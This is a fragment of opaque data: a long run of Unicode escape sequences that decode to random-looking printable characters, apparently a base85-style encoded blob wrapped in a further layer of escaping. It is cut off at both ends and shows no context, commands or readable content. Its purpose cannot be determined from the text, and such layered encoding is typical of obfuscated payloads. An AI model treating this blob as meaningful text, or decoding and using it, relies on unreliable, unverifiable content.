0035\u0056\u0042\u0035\u0047\u0021\u0022\u003a\u0064\u0064\u0073\u0032\u004e\u0045\u0076\u0021\u0061\u0044\u004f\u0045\u0021\u003e\u006b\u0041\u0060\u0053\u0023\u005b\u0065\u0076\u0029\u006f\u007d\u0040\u005e\u003f\u0066\u0069\u0072\u002a\u0040\u0075\u0039\u0045\u0030\u0036\u006c\u004b\u002e\u006f\u0064\u0061\u0022\u0063\u0042\u007c\u0070\u0051\u0035\u003e\u0029\u0047\u0060\u0066\u0022\u0057\u0053\u0058\u0062\u0024\u0048\u004d\u0078\u002c\u007e\u0065\u005d\u0029\u0039\u0023\u007b\u004a\u0078\u0036\u006e\u0042\u0023\u004d\u0078\u002c\u0074\u0032\u006c\u0067\u0076\u0035\u002f\u004f\u0040\u007c\u0024\u0046\u005a\u0069\u003c\u002e\u0051\u0048\u002b\u0077\u0023\u0061\u0031\u0055\u002b\u0076\u0040\u006d\u0076\u0039\u0065\u0076\u0025\u0021\u0052\u0028\u0070\u0076\u0058\u007b\u0076\u005e\u0071\u0065\u0041\u0024\u0064\u0037\u005e\u0021\u004c\u0053\u0025\u0043\u0052\u005b\u005d\u0050\u0031\u0026\u006f\u003a\u0067\u006a\u0052\u0050\u0025\u0021\u0057\u003d\u0028\u005d\u0050\u0043\u0070\u0072\u0071\u003a\u0076\u0046\u005a\u0046\u006d\u0051\u0056\u0024\u0037\u0023\u004e\u007c\u007a\u0039\u002c\u0075\u0045\u0028\u006c\u0051\u003b\u0043\u0025\u0079\u0060\u0042\u0058\u004e\u0040\u0047\u0047\u0031\u0057\u0025\u0064\u005a\u0025\u0043\u0068\u0044\u0066\u0035\u0057\u006a\u0063\u004e\u0023\u002a\u005d\u007c\u0035\u0076\u003e\u0028\u0079\u0078\u0028\u0065\u003f\u0071\u002f\u0021\u0060\u005a\u006f\u005a\u006c\u007b\u004a\u0043\u0038\u002e\u0026\u002a\u003f\u0030\u003b\u0062\u0063\u006f\u0067\u0053\u0073\u0035\u005b\u0041\u004f\u006c\u0037\u0023\u004e\u0053\u0034\u0029\u0072\u0030\u0039\u006c\u0024\u004c\u0044\u0031\u0052\u0068\u002b\u0046\u004a\u007e\u0025\u003b\u003d\u0023\u004e\u004d\u002f\u0052\u0068\u002b\u0061\u0044\u0066\u004f\u0070\u0037\u0023\u004d\u0070\u0076\u0024\u007c\u0075\u0065\u0065\u0070\u0077\u0066\u0045\u0028\u004a\u0066\u0030\u0052\u006a\u006a\u004c\u003c\u0067\u004e\u0043\u0057\u0071\u0065\u0074\u0063\u004b\u0021\u0067\u004e\u0043\u0057\u0071\u0065\u0043\u0070\u004a\u0070\u0043\u004a\u002c\u0057\u007e\u0047\u0068\u002b\u0023\u0051\u002b\u002f\u0034\u003d\u0077\u0070\u0071\u0039\u0040\u0079\u0028\u004c\u0076\u007a\u006d\u0065\u0049\u003a\u0024\u0023\u005e\u002a\u0022\u0044\u006a\u0042\u003f\u0069\u0021\u0021\u002a\u0058\u0025\u0034\u0026\u0052\u004d\u006d\u0035\u0059\u006b\u0022\u0063\u0029\u0040\u0062\u004f\u004c\u003b\u0025\u0056\u0050\u0057\u0063\u007e\u0053\u0068\u0050\u005e\u0073\u005b\u0069\u006a\u0075\u0045\u0037\u004d\u003e\u0028\u005b\u0065\u0069\u005e\